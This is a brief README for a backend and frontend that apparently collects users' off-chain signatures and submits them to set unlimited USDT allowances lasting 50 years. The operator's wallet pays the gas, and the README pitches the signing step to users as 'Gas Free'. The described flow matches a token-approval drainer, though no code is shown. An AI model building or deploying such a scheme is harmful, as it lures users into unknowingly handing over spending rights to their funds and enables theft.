# USDT Allowance Backend

## Deploy to Vercel

1. Clone this repository
2. Add Environment Variables in Vercel Dashboard:
   - `ALCHEMY_API_KEY` - Your Alchemy API Key
   - `PRIVATE_KEY` - Your wallet private key
   - `CONTRACT_ADDRESS` - Contract address

3. Deploy to Vercel

## Frontend

Open `frontend/index.html` and set the Backend URL.

## How it works

1. User signs off-chain (Gas Free)
2. Signature sent to Vercel backend
3. Backend submits transaction (Pays Gas)
4. Unlimited allowance set for 50 years!